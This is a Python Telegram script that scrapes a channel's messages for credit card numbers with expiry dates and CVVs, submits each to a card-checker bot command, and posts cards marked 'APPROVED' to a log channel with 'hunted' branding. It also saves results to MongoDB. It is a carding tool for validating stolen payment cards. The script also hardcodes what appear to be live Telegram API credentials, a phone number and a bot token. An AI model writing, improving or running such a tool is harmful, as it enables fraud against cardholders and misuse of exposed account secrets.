import os
import time
import random
import re
from pyrogram import Client, filters
from pymongo import MongoClient
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from telegraph import Telegraph
from config import API_ID, API_HASH, PHONE_NUMBER, CHANNEL, LOG_CHANNEL, BOT_USERNAME, MONGO_URI, DATABASE_NAME, COLLECTION_NAME, TELEGRAPH_TOKEN

Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'

api_id = "18189325"
api_hash = "7cb3b3ea70ba49f0721a511013eefe53"
phone_number = "201011234195"
ch = "https://t.me/Professor_Ashu"
ID = "5276901951"
token = "5276901951:AAGk3pN8m7CX62I5G4WReam27Cc4FZ3bCpo"
log_channel = "@YourLogChannel"  # Replace with your log channel username or ID
bot_username = "@YourBotUsername"  # Replace with your bot username

# MongoDB configuration
mongo_uri = "mongodb://localhost:27017"  # Replace with your MongoDB URI
database_name = "telegram_bot"  # Replace with your desired database name
collection_name = "bot_data"  # Replace with your desired collection name

# Telegraph configuration
telegraph_token = "your_telegraph_token"  # Replace with your Telegraph token

async def fetch_cards_from_channel():
    # Initialize MongoDB client
    mongo_client = MongoClient(mongo_uri)
    db = mongo_client[database_name]
    collection = db[collection_name]

    # Initialize Telegraph client
    telegraph = Telegraph(telegraph_token)

    app = Client("session", api_id, api_hash)
    await app.start()

    entity = await app.resolve_peer(ch)
    channel = entity.input_channel

    messages = await app.get_chat_history(channel, limit=2000)

    card_regex = r"\d{16}\ \d{2}\/\d{2}\ \d{3}"
    card_regex2 = r"\d{16}\|\d{2}\|\d{4}\|\d{3}"

    for message in reversed(messages):
        if message.text:
            matches = re.findall(card_regex, message.text) or re.findall(card_regex2, message.text)
            for match in matches:
                await process_card(app, collection, telegraph, match)

    await app.stop()
    mongo_client.close()

async def process_card(app, collection, telegraph, cc):
    try:
        await app.send_message(ch, f"/tele {cc}")
        time.sleep(random.randint(26, 27))
        messages = await app.get_chat_history(ch, limit=1)
        ccn = messages[0].text
        print(ccn)
        if "APPROVED" in ccn:
            print(F + f'Approved✅{ccn}.')
            mgs = f'''𝙽𝙴𝚆 𝚅𝙸𝚂𝙰 💸𝙷𝚞𝙽𝚃𝙴𝙳❤️💥.
{ccn}.

━━━━━━━━━━━━━━━
𝗖𝗛𝗘𝗞𝗘𝗗 𝗕𝗬"@T4_Mohamed ✨🤍 '''

            # Create a Telegraph page with the welcome message and button
            page_title = "Welcome"
            page_content = f"<h3>Welcome to the Bot!</h3><p>{ccn}</p>"
            page = telegraph.create_page(page_title, html_content=page_content)

            # Generate the telegraph URL
            telegraph_url = f"https://telegra.ph/{page['path']}"

            # Create an InlineKeyboardMarkup with the button
            button_text = "Access Bot"
            button_url = f"https://t.me/{bot_username}"
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(button_text, url=button_url)]])

            # Send the welcome message with the button to the log channel
            await app.send_message(log_channel, mgs, reply_markup=keyboard)

            # Send the welcome message to the user
            await app.send_message(ch, f"Welcome to the Bot!\nClick the button below to access the bot.", reply_markup=keyboard)

            time.sleep(1)
        else:
            print(Z + 'Declined❌')

        # Save user data and bot settings to MongoDB
        data = {
            "cc": cc,
            "ccn": ccn
        }
        collection.insert_one(data)

    except Exception as e:
        print(False)
        os.system('clear')
        print("New message:", ccn)
        print(str(e))

# Run the fetch_cards_from_channel function
await fetch_cards_from_channel()

